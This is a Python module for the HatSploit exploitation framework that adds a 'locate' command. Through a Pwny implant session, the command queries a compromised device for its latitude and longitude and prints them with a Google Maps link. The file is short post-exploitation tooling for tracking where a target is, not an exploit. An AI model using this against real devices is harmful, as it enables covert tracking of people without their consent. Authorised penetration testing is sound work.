"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny.api import *
from pwny.types import *

from hatsploit.lib.command import Command

LOCATE_BASE = 8

LOCATE_GET = tlv_custom_tag(API_CALL_STATIC, LOCATE_BASE, API_CALL)

LOCATE_LONGITUDE = tlv_custom_type(TLV_TYPE_STRING, LOCATE_BASE, API_TYPE)
LOCATE_LATITUDE = tlv_custom_type(TLV_TYPE_STRING, LOCATE_BASE, API_TYPE + 1)


class HatSploitCommand(Command):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "manage",
            'Name': "locate",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Manage location services.",
            'Usage': "locate <option>",
            'MinArgs': 1,
            'Options': {
                'info': ['', 'Get location.'],
            }
        }

    def run(self, argc, argv):
        if argv[1] == 'info':
            result = self.session.send_command(tag=LOCATE_GET)

            latitude = result.get_string(LOCATE_LATITUDE)
            longitude = result.get_string(LOCATE_LONGITUDE)

            if latitude and longitude:
                self.print_information(f"Latitude:  {latitude}")
                self.print_information(f"Longitude: {longitude}")
                self.print_information(f"Map:       %linehttp://maps.google.com/maps?q={latitude},{longitude}%end")
                return
